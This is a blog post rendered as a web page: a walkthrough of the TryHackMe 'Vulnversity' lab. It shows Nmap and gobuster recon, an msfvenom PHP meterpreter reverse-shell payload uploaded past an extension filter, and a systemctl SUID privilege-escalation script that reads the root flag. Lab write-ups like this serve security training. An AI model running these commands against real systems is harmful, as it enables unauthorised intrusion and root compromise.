<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><link rel="stylesheet" href="/_next/static/css/816f3edd0640ecf0.css" data-precedence="next.js"/><link rel="stylesheet" href="/_next/static/css/2a1840b1c557e13c.css" data-precedence="next.js"/><link rel="preload" as="script" href="//gc.zgo.at/count.js"/><title>/dev/blog - /dev/blog - TryHackMe - Vulnversity</title><meta name="description" content="Learn about active recon, web app attacks and privilege escalation."/><meta name="application-name" content="/dev/blog"/><meta name="generator" content="Next.js"/><meta name="keywords" content="Dev,Blog,Programmings"/><meta name="referrer" content="origin-when-cross-origin"/><meta name="theme-color" content="amber"/><meta name="color-scheme" content="dark"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="creator" content="Joshua Chapman"/><link rel="canonical" href="https://joshuachp.dev/posts/2020-09-02_tryhackme_vulnversity"/><link rel="icon" href="/favicon.svg" type="image/svg+xml"/><link rel="icon" href="/favicon.png" type="image/png"/><link rel="icon" href="/favicon.ico" type="image/x-icon"/><script id="dark-theme">if(localStorage.theme==='Dark'||((!('theme'in localStorage)||localStorage.theme==='Auto')&&window.matchMedia('(prefers-color-scheme: dark)').matches)){document.documentElement.classList.add('dark')}</script><script src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js" nomodule=""></script></head><body class="bg-primary-50 dark:bg-primary-900"><header class="flex flex-row items-baseline justify-between gap-4 p-6 sm:px-12 md:px-24 lg:px-48 xl:px-60 2xl:px-96"><nav class="flex flex-grow flex-row flex-wrap gap-y-4"><a title="Home page" class="mr-8" href="/"><h1 class=" text-primary-900 dark:text-primary-50 text-4xl font-extrabold tracking-tight sm:text-5xl md:text-6xl">/dev/blog</h1></a><ul class="flex flex-grow flex-row items-end justify-start gap-8"><li><a title="Posts" href="/posts"><span class="text-xl md:text-2xl text-primary-900 dark:text-primary-50 underline font-bold">Posts</span></a></li><li><a title="Notes" href="/notes"><span class="text-xl md:text-2xl text-primary-900 dark:text-primary-50  font-bold">Notes</span></a></li></ul></nav><div><button class="rounded border-t-2 border-l-2 border-r-4 border-b-4  border-primary-900 px-4 py-2 text-sm font-medium text-primary-900  hover:bg-primary-100 active:translate-y-0.5 dark:border-primary-50 dark:text-primary-50 dark:hover:bg-primary-800 "><span class="text-sm sm:text-base xl:text-lg text-primary-900 dark:text-primary-50 font-semibold">Auto</span></button></div></header><main class="flex flex-col justify-center p-6 sm:px-12 md:px-24 lg:px-48 xl:px-60 2xl:px-96"><article class="flex max-w-full grow flex-col justify-self-start"><h1 class="mb-4 text-primary-900 dark:text-primary-50 text-4xl font-extrabold tracking-tight sm:text-5xl md:text-6xl"><span>TryHackMe - Vulnversity</span></h1><blockquote><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>The room link can be found at</span>
<a title="" class="font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600" href="https://tryhackme.com/room/vulnversity"><span>TryHackMe - Vulnversity</span></a></p></blockquote><h2 class="mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl"><span>Reconnaissance</span></h2><h3 class="mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl"><span>Nmap</span></h3><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>First, we do a simple Nmap scan</span></p><pre class="language-sh mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>nmap $IP
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>We find six ports open, we can now make a more in-depth scan with</span>
<code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">nmap -sC -sV $IP</code><span>. It will found the service type and version.</span></p><pre class="language-sh mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>nmap -sC -sV $IP
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2020-09-02T14:44:45-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-09-02T18:44:46
|_  start_date: N/A
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>From the OpenSSH version we can find out that the os type is Ubuntu Linux.</span></p><h3 class="mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl"><span>Gobuster</span></h3><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>There is an HTTP port open on </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">3333</code><span> so we can start enumerating it.</span></p><pre class="language-bash mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>gobuster dir -w GitHub/SecLists/Discovery/Web-Content/big.txt -u http://10.10.232.204:3333/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.232.204:3333/
[+] Threads:        10
[+] Wordlist:       GitHub/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/02 20:52:40 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/internal (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
===============================================================
2020/09/02 20:56:58 Finished
===============================================================
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>We can see various pages. Visiting them we find that on </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">/internal</code><span> there is an</span>
<span>upload form.</span></p><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>If we run gobuster again on this path we can find a second directory</span>
<code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">/internal/uploads/</code><span>.</span></p><h2 class="mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl"><span>Exploitation</span></h2><h3 class="mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl"><span>Compromise the webserver</span></h3><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>We start by generating our reverse shell. I chose to use a meterpreter reverse</span>
<span>shell.</span></p><pre class="language-bash mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>msfvenom --payload php/meterpreter/reverse_tcp  LHOST=$USER_IP LPORT=$PORT &gt; payload.php
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Let</span><span>â€™</span><span>s also start the Metasploit console with an </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">exploit/multi/handler</code><span>.</span></p><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Unfortunately if we try to upload it the extension is blocked. If we try the</span>
<span>extensions provided in the image from the challenge, we find that one works. We</span>
<span>can find the uploaded file in the </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">/internal/uploads/</code><span> directory that we found</span>
<span>before.</span></p><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>We now have a shell on the box.</span></p><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Now we background the session and use the </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">post/linux/gather/enum_system</code><span> to</span>
<span>enumerate the system information, including the user accounts. With the </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">loot</code>
<span>command, we can list the gathered items, and at the end of there user list, we</span>
<span>have the </span><strong><span>bill</span></strong><span> user. In his home directory, we can find the user flag which</span>
<span>is readable by </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">www-data</code><span> (our user).</span></p><h3 class="mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl"><span>Privilege escalation</span></h3><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>To gather more information about the box, we can use the </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">upload</code><span> command to</span>
<span>upload the</span>
<a title="" class="font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS"><span>linPEAS</span></a>
<span>script. This will list all the interesting information on the box, including</span>
<span>the SUID binaries. Une of them sticks out, the </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">systemctl</code><span> executable that bad</span>
<span>since we can execute and change the state of all the services on the machine</span>
<span>without root privilege. We look up</span>
<a title="" class="font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600" href="https://gtfobins.github.io/gtfobins/systemctl/"><span>systemctl | GTFOBins</span></a><span> to find</span>
<span>an easy way to exploit it.</span></p><pre class="language-bash mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>#!/bin/sh

TF=$(mktemp).service
echo &#x27;[Service]
Type=oneshot
ExecStart=/bin/sh -c &quot;cat /root/root.txt &gt; /tmp/output&quot;
[Install]
WantedBy=multi-user.target&#x27; &gt; $TF
systemctl link $TF
systemctl enable --now $TF
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>This script will create a temp service file, link, enable, and run it. The</span>
<span>service will be run as root and will cat the flag into the tmp directory that</span>
<span>is readable for us. We could also run a meterpreter reverse shell to gain a</span>
<span>root shell on the box.</span></p></article></main><script src="/_next/static/chunks/webpack-e24f1f8cbee90348.js" async=""></script><script src="/_next/static/chunks/2443530c-65ca4daeaf429502.js" async=""></script><script src="/_next/static/chunks/961-409d5e344dd5ce3d.js" async=""></script><script src="/_next/static/chunks/main-app-113864fcabec0f7c.js" async=""></script></body></html><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"0:\"$L1\"\n"])</script><script>self.__next_f.push([1,"2:I{\"id\":\"8462\",\"name\":\"\",\"chunks\":[\"272:webpack-e24f1f8cbee90348\",\"667:2443530c-65ca4daeaf429502\",\"961:961-409d5e344dd5ce3d\"],\"async\":false}\n4:I{\"id\":\"9178\",\"name\":\"\",\"chunks\":[\"272:webpack-e24f1f8cbee90348\",\"667:2443530c-65ca4daeaf429502\",\"961:961-409d5e344dd5ce3d\"],\"async\":false}\n"])</script><script>self.__next_f.push([1,"1:[\"$\",\"$L2\",null,{\"assetPrefix\":\"\",\"initialCanonicalUrl\":\"/posts/2020-09-02_tryhackme_vulnversity\",\"initialTree\":[\"\",{\"children\":[\"posts\",{\"children\":[[\"path\",\"2020-09-02_tryhackme_vulnversity\",\"d\"],{\"children\":[\"__PAGE__?{\\\"path\\\":\\\"2020-09-02_tryhackme_vulnversity\\\"}\",{}]}]}]},\"$undefined\",\"$undefined\",true],\"initialHead\":\"$L3\",\"globalErrorComponent\":\"$4\",\"notFound\":\"$L5\",\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"children\":[\"$L6\",null,null,[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/816f3edd0640ecf0.css\",\"precedence\":\"next.js\"}]]]}]\n"])</script><script>self.__next_f.push([1,"7:I{\"id\":\"5376\",\"name\":\"\",\"chunks\":[\"619:619-3a70a20416de9ff0\",\"185:app/layout-147fc0c93c3f3e98\"],\"async\":false}\n8:I{\"id\":\"9299\",\"name\":\"\",\"chunks\":[\"619:619-3a70a20416de9ff0\",\"185:app/layout-147fc0c93c3f3e98\"],\"async\":false}\n9:I{\"id\":\"5019\",\"name\":\"\",\"chunks\":[\"619:619-3a70a20416de9ff0\",\"185:app/layout-147fc0c93c3f3e98\"],\"async\":false}\na:I{\"id\":\"1300\",\"name\":\"\",\"chunks\":[\"272:webpack-e24f1f8cbee90348\",\"667:2443530c-65ca4daeaf429502\",\"961:961-409d5e344dd5ce3d\"],\"async\":false}\nb:I{\"id\":\"6022\",\"name\":\"\",\"chun"])</script><script>self.__next_f.push([1,"ks\":[\"272:webpack-e24f1f8cbee90348\",\"667:2443530c-65ca4daeaf429502\",\"961:961-409d5e344dd5ce3d\"],\"async\":false}\n"])</script><script>self.__next_f.push([1,"6:[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[[\"$\",\"head\",null,{\"children\":[[\"$\",\"$L7\",null,{\"production\":true,\"goatCounterApi\":\"a7d98e3f-b56b\"}],[\"$\",\"script\",null,{\"id\":\"dark-theme\",\"dangerouslySetInnerHTML\":{\"__html\":\"if(localStorage.theme==='Dark'||((!('theme'in localStorage)||localStorage.theme==='Auto')\u0026\u0026window.matchMedia('(prefers-color-scheme: dark)').matches)){document.documentElement.classList.add('dark')}\"}}]]}],[\"$\",\"body\",null,{\"className\":\"bg-primary-50 dark:bg-primary-900\",\"children\":[\"$\",\"$L8\",null,{\"children\":[[\"$\",\"$L9\",null,{}],[\"$\",\"main\",null,{\"className\":\"flex flex-col justify-center p-6 sm:px-12 md:px-24 lg:px-48 xl:px-60 2xl:px-96\",\"children\":[\"$\",\"$La\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"childProp\":{\"current\":[\"$\",\"$La\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"posts\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"childProp\":{\"current\":[\"$\",\"$La\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"posts\",\"children\",[\"path\",\"2020-09-02_tryhackme_vulnversity\",\"d\"],\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"childProp\":{\"current\":[\"$Lc\",null,null,[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/2a1840b1c557e13c.css\",\"precedence\":\"next.js\"}]]],\"segment\":\"__PAGE__?{\\\"path\\\":\\\"2020-09-02_tryhackme_vulnversity\\\"}\"}}],\"segment\":[\"path\",\"2020-09-02_tryhackme_vulnversity\",\"d\"]}}],\"segment\":\"posts\"}}]}]]}]}]]}]\n"])</script><script>self.__next_f.push([1,"5:[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[[\"$\",\"head\",null,{\"children\":[[\"$\",\"$L7\",null,{\"production\":true,\"goatCounterApi\":\"a7d98e3f-b56b\"}],[\"$\",\"script\",null,{\"id\":\"dark-theme\",\"dangerouslySetInnerHTML\":{\"__html\":\"if(localStorage.theme==='Dark'||((!('theme'in localStorage)||localStorage.theme==='Auto')\u0026\u0026window.matchMedia('(prefers-color-scheme: dark)').matches)){document.documentElement.classList.add('dark')}\"}}]]}],[\"$\",\"body\",null,{\"className\":\"bg-primary-50 dark:bg-primary-900\",\"children\":[\"$\",\"$L8\",null,{\"children\":[[\"$\",\"$L9\",null,{}],[\"$\",\"main\",null,{\"className\":\"flex flex-col justify-center p-6 sm:px-12 md:px-24 lg:px-48 xl:px-60 2xl:px-96\",\"children\":[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]]}]]}]}]]}]\n"])</script><script>self.__next_f.push([1,"3:[[[\"$\",\"meta\",null,{\"charSet\":\"utf-8\"}],[\"$\",\"title\",null,{\"children\":\"/dev/blog - /dev/blog - TryHackMe - Vulnversity\"}],[\"$\",\"meta\",null,{\"name\":\"description\",\"content\":\"Learn about active recon, web app attacks and privilege escalation.\"}],[\"$\",\"meta\",null,{\"name\":\"application-name\",\"content\":\"/dev/blog\"}],null,null,[\"$\",\"meta\",null,{\"name\":\"generator\",\"content\":\"Next.js\"}],[\"$\",\"meta\",null,{\"name\":\"keywords\",\"content\":\"Dev,Blog,Programmings\"}],[\"$\",\"meta\",null,{\"name\":\"referrer\",\"content\":\"origin-when-cross-origin\"}],[[\"$\",\"meta\",null,{\"name\":\"theme-color\",\"content\":\"amber\"}]],[\"$\",\"meta\",null,{\"name\":\"color-scheme\",\"content\":\"dark\"}],[\"$\",\"meta\",null,{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",null,{\"name\":\"creator\",\"content\":\"Joshua Chapman\"}],null,null,null,null,null,null,null,null,null,[]],[[\"$\",\"link\",null,{\"rel\":\"canonical\",\"href\":\"https://joshuachp.dev/posts/2020-09-02_tryhackme_vulnversity\"}],null,null,null],null,null,[null,null,null,null,null],null,null,null,null,[null,[[\"$\",\"link\",null,{\"rel\":\"icon\",\"href\":\"/favicon.svg\",\"type\":\"image/svg+xml\"}],[\"$\",\"link\",null,{\"rel\":\"icon\",\"href\":\"/favicon.png\",\"type\":\"image/png\"}],[\"$\",\"link\",null,{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\"}]],[],null]]\n"])</script><script>self.__next_f.push([1,"d:I{\"id\":\"3619\",\"name\":\"\",\"chunks\":[\"619:619-3a70a20416de9ff0\",\"991:app/posts/page-a8aca74000a1e875\"],\"async\":false}\ne:I{\"id\":\"7876\",\"name\":\"\",\"chunks\":[\"619:619-3a70a20416de9ff0\",\"563:app/posts/[path]/page-deda6ae7686b2d48\"],\"async\":false}\n"])</script><script>self.__next_f.push([1,"c:[\"$\",\"article\",null,{\"className\":\"flex max-w-full grow flex-col justify-self-start\",\"children\":[[\"$\",\"h1\",null,{\"className\":\"mb-4 text-primary-900 dark:text-primary-50 text-4xl font-extrabold tracking-tight sm:text-5xl md:text-6xl\",\"children\":[[\"$\",\"span\",\"1\",{\"children\":\"TryHackMe - Vulnversity\"}]]}],[\"$\",\"blockquote\",\"11\",{\"children\":[[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"5\",{\"children\":\"The room link can be found at\"}],\"\\r\\n\",[\"$\",\"$Ld\",null,{\"title\":\"\",\"className\":\"font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600\",\"href\":\"https://tryhackme.com/room/vulnversity\",\"children\":[[\"$\",\"span\",\"8\",{\"children\":\"TryHackMe - Vulnversity\"}]]}]]}]]}],[\"$\",\"h2\",null,{\"className\":\"mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl\",\"children\":[[\"$\",\"span\",\"13\",{\"children\":\"Reconnaissance\"}]]}],[\"$\",\"h3\",null,{\"className\":\"mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl\",\"children\":[[\"$\",\"span\",\"16\",{\"children\":\"Nmap\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"19\",{\"children\":\"First, we do a simple Nmap scan\"}]]}],[\"$\",\"$Le\",\"23\",{\"language\":\"sh\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"22\",{\"children\":\"nmap $IP\\nPORT     STATE SERVICE\\n21/tcp   open  ftp\\n22/tcp   open  ssh\\n139/tcp  open  netbios-ssn\\n445/tcp  open  microsoft-ds\\n3128/tcp open  squid-http\\n3333/tcp open  dec-notes\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"25\",{\"children\":\"We find six ports open, we can now make a more in-depth scan with\"}],\"\\r\\n\",[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"nmap -sC -sV $IP\"}],[\"$\",\"span\",\"28\",{\"children\":\". It will found the service type and version.\"}]]}],[\"$\",\"$Le\",\"32\",{\"language\":\"sh\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"31\",{\"children\":\"nmap -sC -sV $IP\\nPORT     STATE SERVICE     VERSION\\n21/tcp   open  ftp         vsftpd 3.0.3\\n22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey:\\n|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)\\n|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)\\n|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)\\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\\n445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)\\n3128/tcp open  http-proxy  Squid http proxy 3.5.12\\n|_http-server-header: squid/3.5.12\\n|_http-title: ERROR: The requested URL could not be retrieved\\n3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))\\n|_http-server-header: Apache/2.4.18 (Ubuntu)\\n|_http-title: Vuln University\\nService Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\\n\\nHost script results:\\n|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s\\n|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: \u003cunknown\u003e, NetBIOS MAC: \u003cunknown\u003e (unknown)\\n| smb-os-discovery:\\n|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)\\n|   Computer name: vulnuniversity\\n|   NetBIOS computer name: VULNUNIVERSITY\\\\x00\\n|   Domain name: \\\\x00\\n|   FQDN: vulnuniversity\\n|_  System time: 2020-09-02T14:44:45-04:00\\n| smb-security-mode:\\n|   account_used: guest\\n|   authentication_level: user\\n|   challenge_response: supported\\n|_  message_signing: disabled (dangerous, but default)\\n| smb2-security-mode:\\n|   2.02:\\n|_    Message signing enabled but not required\\n| smb2-time:\\n|   date: 2020-09-02T18:44:46\\n|_  start_date: N/A\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"34\",{\"children\":\"From the OpenSSH version we can find out that the os type is Ubuntu Linux.\"}]]}],[\"$\",\"h3\",null,{\"className\":\"mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl\",\"children\":[[\"$\",\"span\",\"37\",{\"children\":\"Gobuster\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"40\",{\"children\":\"There is an HTTP port open on \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"3333\"}],[\"$\",\"span\",\"42\",{\"children\":\" so we can start enumerating it.\"}]]}],[\"$\",\"$Le\",\"46\",{\"language\":\"bash\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"45\",{\"children\":\"gobuster dir -w GitHub/SecLists/Discovery/Web-Content/big.txt -u http://10.10.232.204:3333/\\n===============================================================\\nGobuster v3.0.1\\nby OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_)\\n===============================================================\\n[+] Url:            http://10.10.232.204:3333/\\n[+] 